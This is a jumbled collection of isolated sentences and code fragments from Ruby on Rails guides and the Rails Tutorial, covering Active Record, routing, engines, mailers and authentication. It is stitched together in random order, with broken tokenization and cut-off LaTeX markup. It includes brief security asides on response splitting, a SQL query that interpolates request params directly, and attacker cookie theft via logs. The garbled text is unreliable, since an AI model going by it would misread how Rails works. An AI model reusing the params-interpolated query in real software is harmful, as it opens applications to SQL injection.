Rails supports multiple-key indices .

If you have code that looks like ╼ this , you must change your code to do this instead :
If you were to use the class , Rails would attempt ╼ to load that class and then reference the related table .
We &apos;ll next add a follow / unfollow form , and then make dedicated pages for showing user followed users and followers .

If you really mean to load JavaScript from remote ` &lt; script &gt; ` tags , skip CSRF ╼ protection on that action .
This method removes all scoping and will do a normal query on the table .
You can prefix routes with a named parameter also :

user _ name : &apos; &lt; username &gt; &apos; ,
&lt; h1 &gt; Products &lt; / h1 &gt;
Next , we &apos;ll add a Rake task to seed the database with sample users , for which Rails uses the standard location \ kode { db / seeds ▖ rb } .
An alternative and cleaner syntax is to nest the hash conditions :
If the source filename has no extension , ▖ css will be appended .
Installing Rails , generating an application , and editing the resulting files is easy using a pre-configured cloud environment .

In order to use optimistic locking , the table needs to have a column called `lock _ version` of type integer .

The idea of Response Splitting is to inject two CRLFs into a header field , followed by another response with malicious HTML .
If you wish to reference the application inside the engine in a similar way , use ╼ the `main _ app` helper :

TIP : You don &apos;t need to call `to _ xml` on the object that you want to render .
Counter cache columns are added to the containing model &apos;s list of read-only attributes through `attr _ readonly` .
It accepts a hash of options , which can include any of these options :

Implementing \ kode { user ▖ followers } using reverse relationships .
In addition to the generic \ kode { find } , Active Record also allows us to find users by specific attributes :
You can just supply the raw SQL specifying the `JOIN` clause to `joins` :
Defaults to ` : erb` .
User ▖ active ▖ where ( state : &apos; finished &apos; )
You should confirm at this point that the test suite passes :
t ▖ string : publisher _ type
Among them are :
foreign _ key : &quot; this _ user _ id &quot; ,
This ╼ means that a new model instance will be created in memory but won &apos;t be ╼ saved to the database .
If an optional block is given , `many ? ` only takes into account those elements that return true :
class C
In production , Rails precompiles these files to `public / assets` by default .
Next , the partial that this line will render needs to exist .
Object ▖ qualified _ const _ set ( &quot; Math : : Phi &quot; , 1 ▖ 618034 ) # = &gt; 1 ▖ 618034
And this will give you a single `Order` object for each date where there are orders in the database .

This loads all the articles and the associated category and comments for each article .

At this point , the test suite should still be \ passing :
The tests should all be passing now .
The `find _ each` method retrieves a batch of records and then yields _ each _ record to the block individually as a model .
If they are implemented using JavaScript , they may be bypassed if ╼ JavaScript is turned off in the user &apos;s browser .
Because we included \ kode { will \ _ paginate } both above and below the user list , the pagination links appear in both places .
Tests to enforce logged-in status mirror those for the Users controller ( Listing ~ \ ref { code : edit _ update _ redirect _ tests } and Listing ~ \ ref { code : action _ tests _ admin } ) .
If a block is passed the separators are those elements of the array for which the block returns true :

With this code , Active Record automatically returns all the microposts with \ kode { user \ _ id } equal to the id of \ kode { first \ _ user } ( in this case , ~ \ kode { 1 } ) .

Resource routing allows you to quickly declare all of the common routes for a given resourceful controller .

╼ = &gt; Sun , 13 Mar 2011 03 : 38 : 55 UTC + 00 : 00
In this chapter , we &apos;ll take the first critical step by creating a \ emph { data model } for users of our site , together with a way to store that data .
# Blorgh / app / models / article ▖ rb
Here is a summary of the steps shown in Figure ~ \ ref { fig : mvc _ detailed } :
╼ ╼ \ end { enumerate } ╼ ╼ % subsection micropost _ validations ( end ) ╼ ╼ \ subsection { User / Micropost associations } % ( fold ) ╼ \ label { sec : user _ micropost _ associations } ╼ ╼
To create the \ kode { relationships } table , we migrate the database as usual :
The Rails Way ™ is to use migrations every time we discover that our data model needs to change .
* `create _ association ! (
if @ user &amp; &amp; @ user ▖ guest ?
At this point , our test suite should be \ passing :
Indeed , if we have a large number of records , the entire collection may exceed the amount of memory available .
Under the hood , this command executes the \ kode { drop \ _ table } command to remove the users table from the database .
You can call this remote whatever you &apos;d like , but if you don &apos;t use `upstream` , ╼ then change the name to your own in the instructions below .
A diagram of the data model appears in Figure ~ \ ref { fig : user _ has _ many _ following } .
This defines a task \ kode { db : populate } that creates an example user with name and email address replicating our previous one , and then makes 99 more .
The result of the deployment should be a working sample application on the production server ( Figure ~ \ ref { fig : layout _ production } ) .
It creates a ╼ hyperlink based on text to display and where to go - in this case , to the path ╼ for articles .
Now we &apos;ll get our title tests to pass , and at the same time add the full HTML structure needed to make valid web pages .
╼ sample application .
In particular , ╼ `qualified _ constant _ defined ? ` accepts an optional second argument to be ╼ able to say whether you want the predicate to look in the ancestors .
This is ╼ so you can easily add asset pipelining later if you like .
The ╼ `require _ tree` directive in a CSS manifest works the same way as the JavaScript ╼ one , requiring all stylesheets from the current directory .
We can double-check this by verifying that the relevant tests fail :
# # # `reorder`
NOTE : Defined in `active _ support / core _ ext / object / with _ options ▖ rb` .
SELECT * FROM clients WHERE removed _ at IS NULL
&lt; script src = &quot; / javascripts / all ▖ js &quot; &gt; &lt; / script &gt;
The ` : on` option takes one of the values ╼ ` : create` or ` : update` .
In order to forward users to their intended destination , we need to store the location of the requested page somewhere , and then redirect to that location instead .
Failed signup with error messages .
The ability to save a securely hashed \ kode { password \ _ digest } attribute to the database
def validate
( As noted in Section ~ \ ref { sec : conventions } , vertical dots indicate omitted code and should not be copied literally ▖ )
( It &apos;s probably a good idea to write a test for the flash as well , which is left as an exercise ( Section ~ \ ref { sec : exercises _ a _ test _ for _ valid _ submission } ) ▖ )
A mockup of the Home page with a form for creating microposts .
&#124; app / &#124; Contains the controllers , models , views , helpers , mailers and assets for your application .
It &apos;s also easy to add new helpers to your application as it evolves .
The reason we iterate through all possible key / value pairs is so that we can include other kinds of flash messages .
&lt; % = asset _ path &apos; image ▖ png &apos; , host : &apos; mycdnsubdomain ▖ fictional-cdn ▖ com &apos; % &gt;
in Listing ~ \ ref { code : remember _ me _ ternary } .
&lt; % # WRONG % &gt;
Let &apos;s consider the latter first .
Enables the formatting of numbers in a variety of ways .
This code has a formidable combination of Rails , Ruby , and SQL , but it does the job , and does it well .
You may want to further restrict access , using environment-specific versions of these files and any others that may contain sensitive information .
# calling + to _ s + on all elements and joining them .
The biggest difference is that , while anyone can sign up , only the current user should be able to update his information .
foo = &gt; nil
* ` : password` - If your mail server requires authentication , set the password in this setting .
- &gt; { where &quot; factory = &apos; Seattle &apos; &quot; }
This option defaults to an instance of `ActiveSupport : : Logger : : SimpleFormatter` for all modes except production , where it defaults to `Logger : : Formatter` .
qualified _ name = qualified _ name _ for from _ mod , const _ name
The result , with migration name \ kode { add \ _ password \ _ digest \ _ to \ _ users } , appears as follows :
Because of this danger , it is essential that we only update attributes that are safe to edit through the web .
The ╼ &#91; Routes &#93; ( # routes ) section of this guide describes it in detail .
creates \ emph { attribute accessors } corresponding to a user &apos;s name and email address .
Our eventual goal for the user profile pages is to show the user &apos;s profile image , basic user data , and a list of microposts , as mocked up in Figure ~ \ ref { fig : profile _ mockup }
Now we &apos;re ready to write the first signin element , the \ kode { sign \ _ in } function itself .

Even though the tests are passing , you might have noticed this code :
```coffeescript
# # # # # `prev _ month` , `next _ month`
It should look something like the following :
The rest of the tutorial focuses on developing a single large \ emph { real sample application } ( called \ kode { sample \ _ app } ) , writing all the code from scratch .
Our plan is to display the microposts for each user on their respective profile page ( \ kode { show ▖ html ▖ erb } ) , together with a running count of how many microposts they &apos;ve made .
* Provides prepare and cleanup callbacks , intended to assist with code reloading during development .
table _ name ▖ pluralize : table _ name
The `find _ by ! ` method behaves exactly like `find _ by` , except that it will raise `ActiveRecord : : RecordNotFound` if no matching record is found .
in Listing ~ \ ref { code : generate _ users _ controller } .
* `set _ autoload _ paths` This initializer runs before `bootstrap _ hook` .
# # # # General Engine Configuration

With these techniques in hand , we are well-equipped to recover from the inevitable development \ href { http : / / en ▖ wikipedia ▖ org / wiki / Military _ slang # SNAFU } { snafus } .
# # # # # `beginning _ of _ day` , `end _ of _ day`
In the case above , you would need to add a column named `orders _ count` to the `Customer` model .
person ▖ errors ▖ messages
# SELECT id FROM people
If a line is too long , the comment may be placed on the next line :
From the controller &apos;s point of view , there are three ways to create an HTTP response :
For many uses , the two types of strings are effectively identical :
The methods `monday` and `sunday` return the dates for the previous Monday and ╼ next Sunday , respectively .
page ▖ emails ▖ create (
You could set that up this way :
&lt; % = = @ cms ▖ current _ template % &gt; &lt; % # inserts @ cms ▖ current _ template as is % &gt;
= &gt; &quot; $ 2a $ 10 $ kn4cQDJTzV76ZgDxOWk6Je9A0Ttn5sKNaGTEmT0jU7 ▖ ncBJ / 60gHq &quot;
# # # # # `collection ▖ build ( attributes = { } ) `
map { &#124; attribute , message &#124; full _ message ( attribute , message ) }
The second method we &apos;ll need is \ kode { html } , which updates the HTML inside the relevant element with the contents of its argument .
The sum of an empty receiver can be customized in this form as well :
Go ahead and try to create a new article .
Transfer-Encoding : chunked
would try to create the symbol \ kode { : data-turbolinks-track } , which ( it turns out ) is invalid because of the hyphens .
$ git push origin branch _ name
Adding this to the Sessions controller &apos;s \ kode { create } method leads to the amazingly compact code shown in Listing ~ \ ref { code : remember _ me _ ternary } .
* Sets server specific X-Sendfile header .

Why do we need associations between models ?
Most of the ideas in Listing ~ \ ref { code : password _ reset _ integration _ test } have appeared previously in this tutorial ; the only really novel element is the test of the \ kode { input } tag :
For example , `to` returns the subarray of elements up to the one at the passed index :
In the case of a Rails upgrade , that will mean every single piece of functionality in the application .
# # # Configuring Active Support
For top-level or anonymous modules `parent _ name` returns `nil` .
You can connect to the database by setting an environment variable `ENV &#91; &apos; DATABASE _ URL &apos; &#93; ` or by using a configuration file called `config / database ▖ yml` .
Adding the Relationship model validations .
In Rails 4 ▖ 2 , the ╼ invocation of the instance methods are deferred until either `deliver _ now` or ╼ `deliver _ later` is called .
in Listing ~ \ ref { code : user _ relationships _ association } .
console do
format ▖ text { render text : &apos; Render text &apos; }
If you still need the feature you can add the &#91; Active Resource gem &#93; ( https : / / github ▖ com / rails / activeresource ) in your Gemfile .
With the addition of the status feed , we &apos;ve finished the sample application for the \ emph { Ruby on Rails Tutorial } .
Adding microposts to the user \ kode { show } page .
The two share a common `lib` ╼ directory structure , and are both generated using the `rails plugin new` ╼ generator .
raise ArgumentError , &quot; Regexp multiline option not allowed in routing requirements : # { requirement ▖ inspect } &quot;
def new
$ rails generate scaffold User name : string email : string
SQL uses the `HAVING` clause to specify conditions on the `GROUP BY` fields .
In other words , the dot \ kode { ▖ } \ in \ kode { ▖ center } indicates that the rule styles a class .
&lt; li &gt; ` : authentication` - If your mail server requires authentication , you need to specify the authentication type here .
( You may see some warning messages , which you should ignore for now .
Before implementing followed users and followers , we first need to establish the association between users and relationships .
The fully refactored user index .
Adding the User model \ kode { following } association .
This way you can switch back and forth between the topic and master branches , merging in changes every time you reach a natural stopping point .
NOTE : Errors added to `record ▖ errors &#91; : base &#93; ` relate to the state of the record ╼ as a whole , and not to a specific attribute .

If any of these saves fails due to validation errors , then the assignment statement returns `false` and the assignment itself is cancelled .
To get the test to pass , we have to configure our test file with the proper domain host , as shown in Listing ~ \ ref { code : test _ domain _ host } .
# = &gt; &#91; &#91; &quot; 1 &quot; , &quot; 2 &quot; , &quot; 3 &quot; &#93; , &#91; &quot; 4 &quot; , &quot; 5 &quot; , nil &#93; , &#91; &quot; 6 &quot; , &quot; 7 &quot; , nil &#93; &#93;
self : qualified _ const _ get ( mod _ name )
* ` : destroy` , when the object is destroyed , `destroy` will be called on its ╼ associated objects .
generate ( : scaffold , &quot; person name : string &quot; )
* `config ▖ autoload _ paths` accepts an array of paths from which Rails will autoload constants .
If people are encouraging you to tweak your code , then it &apos;s worth making the tweaks and resubmitting .
You can make subsequent calls to the stored content in other templates or the layout by passing the identifier as an argument to `yield` .
This association indicates that each instance of the model has zero or more instances of another model .

The router also routes `PATCH` requests to ` / users / : id` to the `update` action .
Finally , why does Ruby correctly interpret the lines
We saw in Section ~ \ ref { sec : a _ users _ resource } how the information in the \ kode { debug } could help us understand what &apos;s going on in our application .
If this object responds to the `middleware` method , its middleware is inserted before `Rack : : Runtime` in the middleware stack .
So far we &apos;ve used strings as hash keys , but in Rails it is much more common to use \ emph { symbols } instead .
The options argument is interpreted as a hash of header names and values .
Use it only if you know the hard-coded list is enough in your use case .

There may be times when you wish to customize the query used by `has _ many` .
In Ruby , they are optional ; these two are equivalent :
First , the `author _ name` text field needs to be added to the ╼ `app / views / blorgh / articles / _ form ▖ html ▖ erb` partial inside the engine .
Regular expressions are cryptic but powerful .

Without calling ╼ `isolate _ namespace` , the engine &apos;s helpers would be included in an application &apos;s ╼ controllers .

By default , ╼ this is the English - or &quot; en &quot; - template .
in Listing ~ \ ref { code : sample _ microposts } .
This is generally considered to be a best-practice ╼ within the frontend community , but you may occasionally read tutorials that ╼ demonstrate other ways .
Indeed , at this point the Application controller is the only controller we have , which you can verify by running
An initializer is any Ruby file stored under `config / initializers` in your application .

Then run the tests :
Let &apos;s say that `users` table has `id` as the primary _ key but it also has ╼ `guid` column .

Rails will create several files and a route for you .

The answer is that the tag has a clear meaning to human readers , and the class is used by Bootstrap .

Since it &apos;s so common for hashes to use symbols as keys , as of version 1 ▖ 9 Ruby supports a new syntax just for this special case :
By the way , the extra level of indentation on the \ kode { user \ _ params } method is designed to make it visually apparent which methods are defined after \ kode { private } .

Rails provides the \ kode { flash } as a standard way to display temporary messages .
This allows us to rewrite our SCSS like this :
&lt; ul &gt;
Defaults to ` / usr / sbin / sendmail` .
Rails knows that this view belongs to a different controller because of the embedded slash character in the string .
Action View is then responsible for compiling the response .
admin = 1

It &apos;s likely that many of the ideas in this section won &apos;t seem obvious at first , and it may take a while for the rather complicated data model to sink in .
Follow regular punctuation rules :
Although the two are equivalent , using \ kode { assert \ _ no \ _ difference } is cleaner and is more idiomatically correct Ruby .
There is a naming convention for views in Rails .

Because every micropost should have a user id , we &apos;ll add a test for a \ kode { user \ _ id } presence validation .

Signup success creates a user in the database and redirects to the user show page , and displays a welcome message .

Now that we &apos;ve updated the user by running \ kode { user ▖ save } , the magic columns differ , as promised in Section ~ \ ref { sec : creating _ user _ objects } :
This puts the CSS contained within the ╼ file ( if any ) at the precise location of the `require _ self` call .
If the other class contains the foreign key , then you should use `has _ one` instead .
Callbacks are not executed .
In addition to \ kode { length } ( seen in the first line above ) , arrays respond to a wealth of other methods :

Unless you specify a version number to the \ kode { gem } command , Bundler will automatically install the latest requested version of the gem .

We &apos;ll put the resulting \ kode { find } inside a \ kode { correct \ _ user } before filter , which checks that the current user actually has a micropost with the given id .
Since each user should have a feed , we are led naturally to a \ kode { feed } method in the User model .
The problem is that by default ( as of Rails ~ 3 ▖ 2 ▖ 3 ) \ emph { all } of the attributes for our Micropost model are accessible .

Based on this pattern , you may be able to guess how to run \ emph { all } the specs :
You can also pass raw SQL to the `lock` method for allowing different types of locks .
We will also make views to display both a user &apos;s followers and the users each user is following .

The view uses embedded Ruby to render the page as HTML .
The previous example generates `address _ street` rather than `street` .

One nice effect of Cucumber &apos;s separation of concerns is that it operates at a higher level of abstraction .
Some numbers which are not singletons are not duplicable either :
However , this is just duplicating the functionality that would be provided to you by a class method .

Be sure to Google the error message or consult the \ href { http : / / railstutorial ▖ org / help } { Rails Tutorial help page } if you run into trouble .
A typical base64 string appears as follows :

With the migration in Listing ~ \ ref { code : micropost _ migration } , we can update the database as usual :
As with ordinary actions and views , instance variables defined in mailer actions are available in mailer views .
as seen in Listing ~ \ ref { code : user _ fixture _ password _ reset _ token } .
For example , in the whole life of a program the integer 1 refers always to the same instance :
The test sequence is simple :

The idea is simple : both the \ kode { create } and \ kode { destroy } actions should require users to be signed in .

After creating a new Rails application , the next step is to use \ emph { Bundler } to install and include the gems needed by the app .
We can then verify that both the login integration test and the full test suite are \ passing :

# # # # # `collection ▖ create ! (
To prevent users from uploading arbitrarily large files , it is thus essential to include a server-side validation , as in Listing ~ \ ref { code : micropost _ model _ image _ validation } .
The user show page after adding a Users resource .
Index Cond : ( id = 1 )
Creating a gem configuration file .
You can also set conditions via a hash :

This leads to the routes for the Microposts resource shown in Listing ~ \ ref { code : microposts _ resource } .

By default Rails expects that your application is running at the root ╼ ( eg ▖ ` / ` ) .
You can also generate paths and URLs .
Generation of both methods can be prevented by setting ` : instance _ accessor` to `false` .
Cucumber allows the definition of plain-text \ emph { stories } describing application behavior .
this :
There are several other ways to validate data before it is saved into your ╼ database , including native database constraints , client-side validations , ╼ controller-level validations .
The easiest way to add custom validators for validating individual attributes ╼ is with the convenient `ActiveModel : : EachValidator` .
# If the collection has been loaded
# = &gt; &quot; user % 5Bid % 5D = 89 &amp; user % 5Bname % 5D = John + Smith &quot;
Adding \ kode { following } and \ kode { followers } actions to the Users controller .
Within an ERB template , Ruby code can be included using both ` &lt; % % &gt; ` and ` &lt; % = % &gt; ` tags .

The default Rails page ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / riding _ rails _ 4 _ 0-full ▖ png } { ( full size ) }
The method `alias _ method _ chain` provides a shortcut for that pattern :
image _ path ( &quot; edit ▖ png &quot; ) # = &gt; / assets / edit-2d1a2db63fc738690021fedb5a65b68e ▖ png
Web browsers can &apos;t send \ texttt { DELETE } requests natively , so Rails fakes them with JavaScript .
A partial for the \ kode { new } and \ kode { edit } form fields .
The `none` method returns a chainable relation with no records .
Joining Tables

&lt; li &gt; &lt; % = user ▖ name % &gt; &lt; / li &gt;
authors ▖ compact !
Actually , we &apos;ll use the closely related \ kode { flash ▖ now } , but we &apos;ll defer that subtlety until we need it .
In various places there is different behavior when you take the entire stack ╼ into account , one such example is ╼ `ActionView : : Helpers : : AssetTagHelper # image _ tag` :
We can use integration tests to verify form submission behavior and catch regressions .
`respond _ with` and the class-level `respond _ to` methods have been extracted to the `responders` gem .
If there are no errors related to the attribute , it returns an empty array .
╼ $ rails destroy model Foo
Adding some spacing and other universal styling .
Model attributes have a reader , a writer , and a predicate .
# # # # Create the Mailer
which reads like natural language and is much more compact .
invoke helper
Creates a label field .
# # # Production log level
validates : terms _ of _ service , acceptance : { accept : &apos; yes &apos; }
In this case , Rails will create all of the normal routes except the route for `destroy` ( a `DELETE` request to ` / photos / : id` ) .
password _ digest : &quot; $ 2a $ 10 $ A58 / j7wwh3aAffGkMAO9Q ▖ jjh3jshd ▖ 6akhDKtchAz / R ▖ ▖ ▖ &quot;
&lt; option value = &quot; 2 &quot; &gt; Sam &lt; / option &gt;
Applying the idea of factory sequences , we can make 30 users in our test , which ( as we will see ) will be sufficient to invoke pagination :
The basic sequence appears as follows :
&lt; % = form _ tag ( { action : &quot; post &quot; } , multipart : true ) do % &gt;
With the added account activation and password resets , our sample application &apos;s sign up , log in , and log out machinery is complete and professional-grade .
Read through the Rails API entry for \ kode { ActiveRecord : : Base } to get a sense of its capabilities .
In this context , it &apos;s worth noting that , like RSpec , Cucumber can be invoked using a Rake task :
ection blocks ( end ) ╼ ╼ ╼ % subsection arrays _ and _ ranges ( end ) ╼ ╼ \ subsection { Hashes and symbols } % ( fold ) ╼ \ label { sec : hashes _ and _ symbols } ╼ ╼
The one-line method body just sets an instance variable \ kode { @ current \ _ user } , effectively storing the user for later use .

This ╼ engine will provide blogging functionality to its host applications , allowing ╼ for new articles and comments to be created .
We &apos;ll accomplish this task en route to giving users the ability to edit their information , which is the main goal of Chapter ~ \ ref { cha : updating _ showing _ and _ deleting _ users } .
&quot; # { data } ! &quot;
User ▖ where ( id : 1 ) ▖ includes ( : articles ) ▖ explain
Rails has several security features that help you write secure applications , ╼ and you &apos;re running into one of them now .
To specify that only integral numbers are allowed set ╼ ` : only _ integer` to true .
Within `lib / blorgh / engine ▖ rb` is the base class for the engine :
render file : &quot; / path / to / rails / app / views / books / edit ▖ html ▖ erb &quot;
Many of the following features are quite challenging , and I have given some hints about the tools you might need to implement them .
The code to send the password reset email appears in Listing ~ \ ref { code : user _ model _ password _ reset } as follows :
d { code } ╼ \ end { codelisting } ╼ ╼ ╼ \ subsection { Setting the root route } % ( fold ) ╼ \ label { sec : setting _ the _ root _ route } ╼ ╼
Calls to the `render` method generally accept four options :
As long as there is a \ kode { password \ _ digest } column in the database , adding this one method to our model gives us a secure way to create and authenticate new users .
`prev _ quarter` is aliased to `last _ quarter` .
&lt; h1 &gt; Listing Books &lt; / h1 &gt;
Creates an active relationship associated with \ kode { user } ( exception on failure )
In this section , we &apos;ll also see the first hint of a \ emph { status feed } ---a notion brought to full fruition in Chapter ~ \ ref { cha : following _ users } .
Finally , we need to add \ kode { picture } to the list of attributes permitted to be modified through the web .
From Rails 4 ▖ 0 on `delete` automatically tries to find the records matching the given ids before deleting them .
This code , which uses the \ emph { ordered list } tag ~ \ kode { ol } , is responsible for generating the list of microposts , but you can see that it just defers the heavy lifting to a micropost partial .
Adding a \ kode { logged \ _ in \ _ user } before filter .
# 2 ▖ odd ?
For example , to retrieve records in batches of 5000 :
@ url = &apos; http : / / example ▖ com / login&apos;
You should get an activation email as implemented in Section ~ \ ref { sec : account _ activations _ resource } ( Figure ~ \ ref { fig : activation _ email _ production } ) .
It &apos;s also worth noting that this chapter saw the last of the necessary gem installations .
@ order _ ids = @ customer ▖ order _ ids
The authentication machinery from Chapter ~ \ ref { cha : basic _ login } will allow us to use a \ emph { before filter } to ensure that this is the case .
Now if you try to create a new article , you will be greeted with a basic HTTP ╼ Authentication challenge :
Logging in and remembering a user .
Cache-Control : public , max-age = 2592000
In the first case , you can simply avoid using the same name for multiple ╼ routes .
Article ▖ where ( trashed : true ) ▖ rewhere ( trashed : false )
The pattern for editing user information closely parallels that for creating new users ( Chapter ~ \ ref { cha : sign _ up } ) .
In the case of an irreversible migration , such as one to remove a database column , it is necessary to define separate \ kode { up } and \ kode { down } methods in place of the single \ kode { change } method .
t ▖ integer : credit _ rating
In such case you can either pass ` : authenticity _ token = &gt; true` as a form option or set this config setting to `true`
ection a _ user _ object ( end ) ╼ ╼ % section ruby _ classes ( end ) ╼ ╼ \ section { Conclusion } % ( fold ) ╼ \ label { sec : conclusion } ╼ ╼
So , instances can change the class attribute , but cannot override it as it happens with `class _ attribute` ( see above ) .

But actually the Rails team doesn &apos;t want users to rely on this method .

d ▖ advance ( seconds : 1 ) ▖ advance ( months : 1 )
For example , to replace the entire follow form with the string \ kode { &quot; foobar &quot; } , we would write
You can register an interceptor to make modifications to mail messages ╼ right before they are handed to the delivery agents .

You &apos;ll see how to use these a little ╼ later .
We created our first controller , the Static Pages controller , in Section ~ \ ref { sec : static _ pages } .
Do yourself a favor and make sure your test coverage is good _ before _ you start an upgrade .
For example , if you take a look back at Figure ~ \ ref { fig : cloud9 _ gemfile } , you &apos;ll see a small vertical line on the right to help keep code under 80 characters .

The toy app developed in this chapter has several strengths and a host of weaknesses .
in Listing ~ \ ref { code : demo _ users _ controller } .
The final part of the layout is a \ kode { div } for the main content :
require &apos; other _ engine / engine&apos;
The primary form builder for Rails is provided by a helper ╼ method called `form _ for` .
_ app _ setup ( end ) ╼ ╼ \ section { Static pages } % ( fold ) ╼ \ label { sec : static _ pages } ╼ ╼

Select ``Show hidden files &apos; &apos; to show the \ kode { ▖ gitignore } file in the application &apos;s root directory ( Figure ~ \ ref { fig : show _ hidden _ files } ) .
Next , we &apos;ll add a Rake task to create sample users .
put : update _ name , on : : member
a2 ▖ x = 2
BigDecimal ▖ new ( 5 ▖ 00 , 6 ) ▖ to _ formatted _ s # = &gt; &quot; 5 ▖ 0 &quot;
The first step is to think of the kind of query we &apos;ll need .
{ a : 1 , b : 2 , c : 3 } ▖ sum # = &gt; &#91; : b , 2 , : c , 3 , : a , 1 &#93;
As part of generating the mailer , Rails also generates two view templates for each mailer , one for plain-text email and one for HTML email .
Guard monitors changes in the filesystem so that , for example , when we change the \ kode { static \ _ pages \ _ controller \ _ test ▖ rb } file , only those tests get run .
In particular , the first route in Table ~ \ ref { table : RESTful _ password _ resets } gives a link to the ``forgot password &apos; &apos; form via
# # # # radio _ button
To speed this up , we can open a dedicated terminal window , navigate to the application root directory , and then start a Spork server :
We can test for this by first destroying a micropost &apos;s user and then verifying that the associated microposts are no longer in the database .

If you want to use the new `JSON`-based format ╼ in your application , you can add an initializer file with the following content :
Try running
By default , \ emph { all } model attributes are accessible .
This isn &apos;t as hard as it sounds , because Rails has generated useful example tests for us ( Listing ~ \ ref { code : generated _ user _ mailer _ test } ) .
* You may not have write access to your production file system .
This action is now displaying the parameters for the article that are coming in ╼ from the form .
&lt; % = f ▖ text _ field : last _ name % &gt;
# Be sure to restart your server when you modify this file .
An example of such a table appears in Figure ~ \ ref { fig : users _ table } , corresponding to the data model shown in Figure ~ \ ref { fig : user _ model _ sketch } .
To define a concern :
Defaults to ` &apos; encrypted cookie &apos; ` .
Client ▖ where ( &quot; orders _ count = # { params &#91; : orders &#93; } &quot; )
# # # Adding links
&lt; % = f ▖ text _ field : first _ name % &gt;
class _ attribute : table _ name _ prefix , instance _ writer : false
As a consequence `false` can &apos;t be a used as a padding value .
# # # Sending Emails without Template Rendering
The ╼ default error message for this option is _ &quot; must be less than % { count } &quot; _ .
&#124; * * Redirection * * &#124; 300 &#124; : multiple _ choices &#124;
First , let &apos;s create a simple `User` scaffold :
This error indicates that Rails cannot find the `new` action inside the ╼ `ArticlesController` that you just generated .
This technique is useful caching pieces like menus , lists of news topics , static HTML fragments , and so on .
&quot; spec / requests / authentication _ pages _ spec ▖ rb &quot;
% Q ( &lt; div class = &quot; field _ with _ errors &quot; &gt; # { html _ tag } &lt; / div &gt; ) ▖ html _ safe
The `form _ for` call here uses ╼ an array , which will build a nested route , such as ` / articles / 1 / comments` .
= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =
The result of the above discussion is the user / relationship association shown in Listing ~ \ ref { code : user _ relationships _ association } and Listing ~ \ ref { code : relationship _ belongs _ to } .
If you want to see the average of a certain number in one of your tables you can call the `average` method on the class that relates to the table .
/ / = require home
The Home page with a form error .
We will thus have to tell Rails the model class name to look for .
* * `ActionDispatch : : DebugExceptions` * *
The application code , which introduces the \ kode { redirect \ _ to } method , appears in Listing ~ \ ref { code : user _ create _ action } .
Then merge the changes back into the master branch using the same technique as in Section ~ \ ref { sec : git _ commands }
Since we don &apos;t want to display debug information to users of a deployed application , Listing ~ \ ref { code : rails _ debug } uses
class C &lt; B ; end
Eager loading may trigger more than one query under the hood , and some queries ╼ may need the results of previous ones .
The easiest solution is to suppress the feed entirely by assigning it an empty array , as shown in Listing ~ \ ref { code : microposts _ create _ action _ with _ feed } .
We start by defining two time intervals .
╼ ╼ \ subsection { What we learned in this chapter } % ( fold ) ╼ \ label { sec : sign _ up _ what _ we _ learned _ in _ this _ chapter } ╼ ╼ \ begin { itemize } ╼ ╼ \ item
render action : &quot; edit ▖ html ▖ erb &quot;
The methods `beginning _ of _ month` and `end _ of _ month` return the dates for the beginning and end of the month :
That is , it works , but it &apos;s not the Rails way .
* `edit _ geocoder _ path` returns ` / geocoder / edit`

There &apos;s a new choice for sanitizing HTML fragments in your applications .
It works in this case because the Rails console automatically includes the Rails extensions to Ruby .
Gravatar is a free service that allows users to upload images and associate them with email addresses they control .
╼ end
To get code like \ kode { @ user ▖ microposts ▖ build } to work , we need to update the User and Micropost models with code to associate them .
following-users
use ActionDispatch : : DebugExceptions
By the end of it , though , we will have created an industrial-strength system for validating , storing , and retrieving user information .
This is in contrast to the popular open-source version control system called Subversion , in which a commit necessarily makes changes on a remote repository .
The micropost index page ( \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / microposts } { / microposts } ) .
This is the first time we &apos;ve seen the command to create a test database with the correct structure :
# = &gt; { name : &#91; &quot; can &apos;t be blank &quot; &#93; }
See the &#91; configuration section in the Action Mailer guide &#93; ( http : / / guides ▖ rubyonrails ▖ org / action _ mailer _ basics ▖ html # action-mailer-configuration ) for more info .
* `config ▖ log _ tags` accepts a list of methods that the `request` object responds to .
Defaults to `-i -t` ▖ &lt; / li &gt; &lt; / ul &gt; &#124;
# # # # `singularize`
Since it is possible to embed ERB in your `config / database ▖ yml` it is best practice to explicitly show you are using the `ENV &#91; &apos; DATABASE _ URL &apos; &#93; ` to connect to your database .
So the payload is in the style attribute .

# # # Routing to Rack Applications
What we want to do is select from the \ kode { microposts } table all the microposts with ids corresponding to the users being followed by a given user ( or the user itself ) .
Now , suppose we wanted to add a new order for an existing customer .
An object like a string , for example , can respond to the message \ kode { length } , which returns the number of characters in the string :
We &apos;ll opt for the final of these options : when users sign in , we will remember their signin status ``forever &apos; &apos; , clearing the session only when the user explicitly signs out .

All items must respond to `to _ xml` , an exception is raised otherwise .

gem &apos; blorgh &apos; , path : &quot; vendor / engines / blorgh &quot;
A test for an invalid signup .
To build a form for creating microposts , we use the code in Listing ~ \ ref { code : microposts _ home _ page } , which serves up different HTML based on whether the site visitor is logged in or not .
The default location for the manifest is the root of the location specified in ╼ `config ▖ assets ▖ prefix` ( &apos; / assets &apos; by default ) .
You can use this method when you want to say that the object is invalid , no matter the values of its attributes .
The same goes for \ kode { rake } , etc ▖ :

It &apos;s common to have resources that are logically children of other resources .

Rails now creates routes to the `CategoriesController` .

All of these lessons , of course , apply ╼ to vanilla JavaScript as well .
Our first step is to generate an integration test as usual :
If you want to assign an object to a `has _ and _ belongs _ to _ many` association without saving the object , use the `collection ▖ build` method .
For example :
Testing for the \ kode { : name } and \ kode { : email } attributes .
# # # # `app` Directory
Moreover , by using \ kode { get } we arrange for the route to respond to a \ texttt { GET } request , which is one of the fundamental
After restarting Sublime Text , the RubyTest package supplies the following commands :
Since we have already done one push ( Section ~ \ ref { sec : bitbucket } ) , on most systems we can omit \ kode { origin master } , and simply run \ kode { git push } :

\ emph { URI } stands for Uniform Resource Identifier , while the slightly less general \ emph { URL } stands for Uniform Resource Locator .
The code \ kode { user ▖ microposts ▖ build ( ▖ ▖ ▖ ) } returns a new Micropost object automatically associated with the given user .
Rails &apos; \ kode { has \ _ many : through } allows the modeling of complicated data relationships .
Note ╼ that each associated object will contain its own `errors` collection ; errors do ╼ not bubble up to the calling model .
If the first matching route is :
foo : bar
Our first step is to write a failing test for the About page .
route resources : users
But the attacker can review their web server &apos;s access log files to see the victim &apos;s cookie .
